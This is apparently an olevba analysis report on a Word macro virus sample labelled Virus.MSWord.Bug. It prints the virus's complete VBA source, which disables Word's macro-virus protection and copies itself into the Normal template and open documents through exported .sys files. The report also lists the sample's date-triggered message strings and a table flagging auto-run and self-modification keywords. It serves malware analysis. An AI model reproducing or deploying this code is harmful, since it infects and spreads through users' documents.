olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'xLock09.12.04 11:52:30Bug
x.UserForm_Click
'xLock09.12.04 11:52:30Bug
If Day(Now) = 28 And Month(Now) = 7 Then x.Show
'xLock09.12.04 11:52:30Bug
End Sub
'xLock09.12.04 11:52:30Bug
Sub ViewVBCode()
'xLock09.12.04 11:52:30Bug
End Sub
'xLock09.12.04 11:52:30Bug
Sub ToolsMacro()
'xLock09.12.04 11:52:30Bug
End Sub
-------------------------------------------------------------------------------
VBA MACRO x.frm 
in file: Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b - OLE stream: 'Macros/VBA/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'xLock09.12.04 11:52:30Bug
Sub UserForm_Click()
'xLock09.12.04 11:52:30Bug
On Error GoTo out
'xLock09.12.04 11:52:30Bug
Options.VirusProtection = False
'xLock09.12.04 11:52:30Bug
Options.SaveNormalPrompt = False
'xLock09.12.04 11:52:30Bug
Options.ConfirmConversions = False
'xLock09.12.04 11:52:30Bug
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'xLock09.12.04 11:52:30Bug
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'xLock09.12.04 11:52:30Bug
If nt > 0 And ad > 0 Then GoTo out
'xLock09.12.04 11:52:30Bug
If nt = 0 Then
'xLock09.12.04 11:52:30Bug
    Set infect = NormalTemplate.VBProject.VBComponents
'xLock09.12.04 11:52:30Bug
    Set host = ActiveDocument.VBProject.VBComponents
'xLock09.12.04 11:52:30Bug
    host.Item(1).codemodule.replaceline 3, Application.UserInitials & ".UserForm_Click"
'xLock09.12.04 11:52:30Bug
    host.Item(1).codemodule.replaceline 5, "If Day(Now) = 28 And Month(Now) = 7 Then " & Application.UserInitials & ".show"
'xLock09.12.04 11:52:30Bug
    host.Item(1).Name = infect.Item(1).Name
'xLock09.12.04 11:52:30Bug
    host.Item(2).Name = Application.UserInitials
'xLock09.12.04 11:52:30Bug
    host.Item(1).Export "c:\one.sys"
'xLock09.12.04 11:52:30Bug
    host.Item(2).Export "c:\two.sys"
'xLock09.12.04 11:52:30Bug
End If
'xLock09.12.04 11:52:30Bug
If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents
'xLock09.12.04 11:52:30Bug
infect.Import ("c:\two.sys")
'xLock09.12.04 11:52:30Bug
infect.Item(1).codemodule.AddFromFile ("c:\one.sys")
'xLock09.12.04 11:52:30Bug
With infect.Item(1).codemodule
'xLock09.12.04 11:52:30Bug
    For x = 1 To 4
'xLock09.12.04 11:52:30Bug
    .deletelines 1
'xLock09.12.04 11:52:30Bug
    Next x
'xLock09.12.04 11:52:30Bug
    If nt = 0 Then
'xLock09.12.04 11:52:30Bug
    .insertlines 9, vbCr & "Sub ViewVBCode()"
'xLock09.12.04 11:52:30Bug
    .insertlines 11, vbCr & "End Sub"
'xLock09.12.04 11:52:30Bug
    .insertlines 13, vbCr & "Sub ToolsMacro()"
'xLock09.12.04 11:52:30Bug
    .insertlines 15, vbCr & "End Sub"
'xLock09.12.04 11:52:30Bug
    End If
'xLock09.12.04 11:52:30Bug
End With
'xLock09.12.04 11:52:30Bug
If nt = 0 Then infect.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'xLock09.12.04 11:52:30Bug
If nt = 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'xLock09.12.04 11:52:30Bug
With infect.Item(2).codemodule
'xLock09.12.04 11:52:30Bug
    .deletelines 1
'xLock09.12.04 11:52:30Bug
    For x = 1 To infect.Item(2).codemodule.countoflines Step 2
'xLock09.12.04 11:52:30Bug
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'xLock09.12.04 11:52:30Bug
    Next x
'xLock09.12.04 11:52:30Bug
End With
'xLock09.12.04 11:52:30Bug
With infect.Item(1).codemodule
'xLock09.12.04 11:52:30Bug
    For x = 2 To infect.Item(1).codemodule.countoflines Step 2
'xLock09.12.04 11:52:30Bug
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'xLock09.12.04 11:52:30Bug
    Next x
'xLock09.12.04 11:52:30Bug
End With
'xLock09.12.04 11:52:30Bug
out:
'xLock09.12.04 11:52:30Bug
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'xLock09.12.04 11:52:30Bug
End Sub
'xLock09.12.04 11:52:30Bug
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WOOBIE@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"Das Woo"�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R.I.P. July 28, 1998�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�We Love YOu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1992-1998�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You Will Be Missed, �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label13'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label14'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label15'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label16'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label17'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label18'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label19'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label20'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label21'" IN 'Virus.MSWord.Bug-52f5d4b42377ed8ede886a2c1d0f70d7b2cdf53b' - OLE stream: 'Macros/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

